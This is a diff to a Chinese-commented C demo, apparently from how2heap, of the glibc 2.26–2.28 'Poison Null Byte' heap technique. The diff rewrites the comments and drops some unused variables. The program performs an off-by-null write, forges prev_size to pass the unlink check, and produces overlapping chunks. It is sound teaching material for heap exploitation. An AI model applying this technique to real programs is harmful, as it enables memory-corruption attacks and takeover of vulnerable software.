@@ -3,10 +3,15 @@
  *
  * 手法：Poison Null Byte
  * 文件标注范围：glibc 2.26～2.28，x86-64 上游堆管理器。
- * 模拟漏洞：只能向相邻 chunk 的 size 最低字节写一个 NUL（off-by-null）。
- * 成功判据：最终 assert 证明新分配 chunk 与仍在使用的 victim 重叠。
+ * 模拟漏洞：只能向相邻 chunk 的 size 字段最低字节写入一个空字节，
+ *   也就是常说的 off-by-null。
+ * 成功判据：最后一处 assert 证明新分配出来的 chunk 与仍在使用的 victim
+ *   发生了重叠。
  *
- * 2.26 起 unlink 会检查 chunksize(P)==prev_size(next_chunk(P))。本链把尺寸放大到 largebin/tcache 上限之外，并在缩小后的 b 尾部伪造一致的 next->prev_size；随后仍利用 c 的陈旧 prev_size 制造跨 b2 合并。
+ * 2.26 开始，unlink 会检查 chunksize(P)==prev_size(next_chunk(P))。这条链
+ * 把尺寸放大到超出 largebin/tcache 上限，并在缩小后的 b 尾部提前伪造出
+ * 一致的 next->prev_size 来满足这条检查；随后仍然利用 c 保留的陈旧
+ * prev_size，制造出跨过 b2 的合并。
  *
  * 来源：shellphish/how2heap poison_null_byte.c；本目录按 glibc 源码边界
  * 重命名、补充中文导读并在对应运行时验证。程序故意包含 UAF、越界写
@@ -31,48 +36,49 @@ int main()
 	uint8_t* b1;
 	uint8_t* b2;
 	uint8_t* d;
-	void *barrier;
 
 	a = (uint8_t*) malloc(0x500);
 
 	int real_a_size = malloc_usable_size(a);
 
 	/*
-	 * 被毒化 chunk 的原 size 低字节不能本来就是 0x00，否则 off-by-null 不会
-	 * 改变有效尺寸。本例选择请求值加 header 后低字节为 0x10，空字节覆盖会
-	 * 把物理尺寸向下截短 0x10，同时清除 PREV_INUSE。
+	 * 被毒化 chunk 原本的 size 低字节不能已经是 0x00，否则 off-by-null 写
+	 * 下去也不会改变有效尺寸。这里选择的请求值加上 header 后低字节正好是
+	 * 0x10，空字节覆盖会把物理尺寸向下截短 0x10，同时把 PREV_INUSE 位一起
+	 * 清掉。
 	 */
 	b = (uint8_t*) malloc(0xa00);
 
 	c = (uint8_t*) malloc(0x500);
 
-	barrier =  malloc(0x100);
+	malloc(0x100); // 保护块防止 c 与 top 合并。
 
-	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
-
-	// 提交 17f487b 增加 chunksize(P)==prev_size(next_chunk(P)) 检查，需提前伪造截短后的边界。
+	// 提交 17f487b 增加了 chunksize(P)==prev_size(next_chunk(P)) 的检查，
+	// 所以这里要提前把截短之后的边界伪造好。
 	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
-	// 因而攻击者必须能向 b 内部写完整机器字，只有字符串式写入、遇空字节停止时通常不够。
-	// 需要在截短后 next_chunk 位置 b+0x9f0 写入 prev_size=0xa00；下方执行真实写入。
-	// off-by-null 把 0xa11 截成 0xa00，因此在新 next_chunk 处写入同值，满足一致性检查。
+	// 也正因为有这个检查，攻击者必须能向 b 内部写入完整的机器字；如果只有
+	// 遇到空字节就停止的字符串式写入，通常是做不到的。
+	// 我们需要在截短后 next_chunk 所在的 b+0x9f0 处写入 prev_size=0xa00，
+	// 下面这一行就是真正执行这次写入。off-by-null 会把 0xa11 截成 0xa00，
+	// 所以只要在新 next_chunk 处写入同样的值，就能满足这条一致性检查。
 	*(size_t*)(b+0x9f0) = 0xa00;
 
-	// 先释放 b，再用 a 的 off-by-null 修改这个 free chunk 的 size 元数据。
+	// 先释放 b，再借助 a 的 off-by-null 去改这个 free chunk 记录的 size。
 	free(b);
 
-	a[real_a_size] = 0; // 漏洞触发：越过 a 用户区一字节，把 b->size 最低字节清零。
+	a[real_a_size] = 0; // 漏洞触发点：越过 a 的用户区写一个字节，把 b->size 的最低字节清零。
 
-	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
-
-	// 下一次 malloc 会对原 b 所在 free chunk 执行 unlink。提交 17f487b 会核对
-	// chunksize(P) 与 prev_size(next_chunk(P))；前面已在截短后的新边界写入
-	// 相同值，因此不会把预期利用判为 corrupted size vs. prev_size。
+	// 下一次 malloc 会对原来 b 所在的这个 free chunk 执行 unlink。提交
+	// 17f487b 会核对 chunksize(P) 与 prev_size(next_chunk(P)) 是否一致；
+	// 前面已经在截短后的新边界写好了相同的值，所以不会被判定为大小不一致
+	// （即报错信息里的 corrupted size vs. prev_size）。
 	// next_chunk(P) == b-0x10+0xa00 == b+0x9f0
-	// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00
+	// prev_size(next_chunk(P)) == *(b+0x9f0) == 0xa00
 
 	b1 = malloc(0x500);
 
-	// 真题中的 b2 往往是含函数指针、长度或对象指针的活动结构；重叠后即可控制这些字段。
+	// 真实题目里的 b2 往往是包含函数指针、长度字段或对象指针的活动结构；
+	// 一旦发生重叠，我们就能直接控制这些字段的值。
 
 	b2 = malloc(0x480);
 
@@ -80,10 +86,10 @@ int main()
 
 	free(b1);
 	free(c);
-	
+
 	d = malloc(0xc00);
 
 	memset(d,'D',0xc00);
 
-	assert(strstr(b2, "DDDDDDDDDDDD"));
+	assert(strstr((char *)b2, "DDDDDDDDDDDD")); // b2 仍在使用，却能读到 d 写入的内容，证明二者确实发生了重叠。
 }
